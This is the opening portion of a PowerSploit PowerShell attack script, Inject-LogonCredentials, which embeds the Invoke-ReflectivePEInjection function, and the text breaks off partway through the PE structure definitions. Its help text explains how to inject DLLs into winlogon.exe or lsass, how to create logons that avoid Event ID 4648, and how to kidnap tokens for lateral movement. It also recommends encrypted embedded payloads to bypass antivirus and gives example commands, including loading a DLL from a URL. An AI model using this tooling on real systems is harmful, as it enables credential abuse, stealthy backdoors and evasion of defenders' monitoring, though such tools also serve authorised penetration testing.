function Inject-LogonCredentials
{
    <#
    .SYNOPSIS

    This script allows an attacker to create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to 
    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or 
    logs on locally). The injected DLL then impersonates the new logon token with its current thread so that it can be kidnapped using Invoke-TokenManipulation.

    PowerSploit Function: Inject-LogonCredentials
    Author: Joe Bialek, Twitter: @JosephBialek
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 0.1

    .DESCRIPTION

    This script allows an attacker to create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to 
    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or 
    logs on locally). The injected DLL then impersonates the new logon token with its current thread so that it can be kidnapped using Invoke-TokenManipulation.

    .PARAMETER NewWinLogon

    Switch. Specifies that this script should create a new WinLogon.exe process. This may be suspicious, as log correlation can show winlogon.exe was 
    created by PowerShell.exe.

    .PARAMETER ExistingWinLogon

    Switch. Specifies that this script should use an existing WinLogon.exe process. This will leave behind code (a reflectively loaded DLL) in the process.

    .PARAMETER DomainName

    The domain name of the user account.

    .PARAMETER UserName

    The username to log in with.

    .PARAMETER Password

    The password of the user.

	
    .EXAMPLE

    Inject-LogonCredentials -DomainName "demo" -UserName "administrator" -Password "Password1"

    .NOTES
    Normally when you do a RunAS logon, the EventID 4648 will show your current account, current process, and the account you are logging in with.
    Incident responders use this to look for lateral movement. They can see a random user logging in with high privilege credentials, which stands out.
    This script allows you to create the logon from within winlogon.exe, as SYSTEM. This allows you to create 4648 event logs which make it appear that the
    user logged in using RDP or logged in locally, rather than the logon showing up as a suspicious RunAS. Then you can use token kidnapping, such as the
    Invoke-TokenManipulation script to kidnap the security token. This token can then be used to authenticate over the network for pivoting and other post
    exploitation.

    .LINK

    Blog: http://clymb3r.wordpress.com/
    Github repo: https://github.com/clymb3r/PowerShell

    #>

    [CmdletBinding()]
    Param(
        [Parameter(ParameterSetName = "NewWinLogon", Position = 0)]
	    [Switch]
	    $NewWinLogon,

        [Parameter(ParameterSetName = "ExistingWinLogon", Position = 0)]
	    [Switch]
	    $ExistingWinLogon,

        [Parameter(Position=1, Mandatory=$true)]
        [String]
        $DomainName,

        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $UserName,

        [Parameter(Position=3, Mandatory=$true)]
        [String]
        $Password
    )

    Set-StrictMode -Version 2




    function Invoke-ReflectivePEInjection
    {
    <#
    .SYNOPSIS

    This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
    or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
    please lead the Notes section (GENERAL NOTES) for information on how to use them.


    1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
    Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

    This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
    this will load and execute the DLL/EXE in to memory without writing any files to disk.


    2.) Reflectively load a DLL in to memory of a remote process.
    As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

    This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
    from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
    remote process. 


    While this script provides functionality to specify a file to load from disk or from a URL, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
    containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
    bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
    blog linked below (thanks to whitey).

    PowerSploit Function: Invoke-ReflectivePEInjection
    Author: Joe Bialek, Twitter: @JosephBialek
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.1

    .DESCRIPTION

    Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

    .PARAMETER PEPath

    The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.

    .PARAMETER PEUrl

    A URL containing a DLL/EXE to load and execute.

    .PARAMETER ComputerName

    Optional, an array of computernames to run the script on.

    .PARAMETER FuncReturnType

    Optional, the return type of the function being called in the DLL. Default: Void
	    Options: String, WString, Void. See notes for more information.
	    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
    .PARAMETER ExeArgs

    Optional, arguments to pass to the executable being reflectively loaded.
	
    .PARAMETER ProcName

    Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

    .PARAMETER ProcId

    Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
	
    .EXAMPLE

    Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
    Note that the file name on the website can be any file extension.
    Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString

    .EXAMPLE

    Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
    Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local

    .EXAMPLE

    Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	    the wchar_t* returned by WStringFunc() from all the computers.
    Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

    .EXAMPLE

    Load DemoEXE and run it locally.
    Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"

    .EXAMPLE

    Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
    Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local

    .NOTES
    GENERAL NOTES:
    The script has 3 basic sets of functionality:
    1.) Reflectively load a DLL in to the PowerShell process
	    -Can return DLL output to user when run remotely or locally.
	    -Cleans up memory in the PS process once the DLL finishes executing.
	    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
	    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
    2.) Reflectively load an EXE in to the PowerShell process.
	    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	    -Cleans up memory in the PS process once the DLL finishes executing.
	    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
    3.) Reflectively inject a DLL in to a remote process.
	    -Can NOT return DLL output to the user when run remotely OR locally.
	    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
	    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.



    DLL LOADING NOTES:

    PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
    If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
    return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
    remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
    applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

    For DLL Loading:
    Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
    I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
    the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
    returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
    wchar_t*   : FuncReturnType = WString
    char*      : FuncReturnType = String
    void       : Default, don't supply a FuncReturnType

    For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
    using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

    The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
    WString    : WStringFunc
    String     : StringFunc
    Void       : VoidFunc

    These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
    be declared as follows:
    extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


    If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
    this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

    Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

    .LINK

    Blog: http://clymb3r.wordpress.com/
    Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection

    Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
    Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
    Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/

    #>

    [CmdletBinding()]
    Param(
	    [Parameter(Mandatory = $true)]
	    [Byte[]]
	    $Bytes32,
	
	    [Parameter(Mandatory = $true)]
	    [Byte[]]
	    $Bytes64,
	
	    [Parameter(Position = 1)]
	    [String[]]
	    $ComputerName,
	
	    [Parameter(Position = 2)]
        [ValidateSet( 'WString', 'String', 'Void' )]
	    [String]
	    $FuncReturnType = 'Void',
	
	    [Parameter(Position = 3)]
	    [String]
	    $ExeArgs,
	
	    [Parameter(Position = 4)]
	    [Int32]
	    $ProcId,
	
	    [Parameter(Position = 5)]
	    [String]
	    $ProcName
    )

    Set-StrictMode -Version 2


    $RemoteScriptBlock = {
	    [CmdletBinding()]
	    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $false)]
		    [String]
		    $FuncReturnType,
				
		    [Parameter(Position = 2, Mandatory = $false)]
		    [Int32]
		    $ProcId,
		
		    [Parameter(Position = 3, Mandatory = $false)]
		    [String]
		    $ProcName
	    )
	
	    ###################################
	    ##########  Win32 Stuff  ##########
	    ###################################
	    Function Get-Win32Types
	    {
		    $Win32Types = New-Object System.Object

		    #Define all the structures/enums that will be used
		    #	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		    $Domain = [AppDomain]::CurrentDomain
		    $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		    $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		    ############    ENUM    ############
		    #Enum MachineType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		    $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		    $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		    $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		    $MachineType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		    #Enum MagicType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		    $MagicType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		    #Enum SubSystemType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		    $SubSystemType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		    #Enum DllCharacteristicsType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		    $DllCharacteristicsType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		    ###########    STRUCT    ###########
		    #Struct IMAGE_DATA_DIRECTORY
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		    ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		    #Struct IMAGE_FILE_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		    $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		    $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		    #Struct IMAGE_OPTIONAL_HEADER64
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		    ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		    ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		    ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		    ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		    ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		    ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		    ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		    ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		    ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		    ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		    ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		    ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		    ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		    ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		    ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		    ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		    ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		    ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		    ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		    ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		    ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		    ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		    ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		    ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		    ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		    ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		    ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		    ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		    ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		    ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		    ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		    ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		    ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		    ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		    $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		    #Struct IMAGE_OPTIONAL_HEADER32
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		    ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		    ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		    ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		    ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		    ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		    ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		    ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		    ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		    ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		    ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		    ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		    ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		    ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		    ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		    ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		    ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		    ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		    ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		    ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		    ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		    ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		    ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		    ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		    ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		    ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		    ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		    ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		    ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		    ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		    ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		    ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		    ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		    ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		    ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		    $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		    #Struct IMAGE_NT_HEADERS64
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		    $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		    $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		    $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		    #Struct IMAGE_NT_HEADERS32
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		    $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
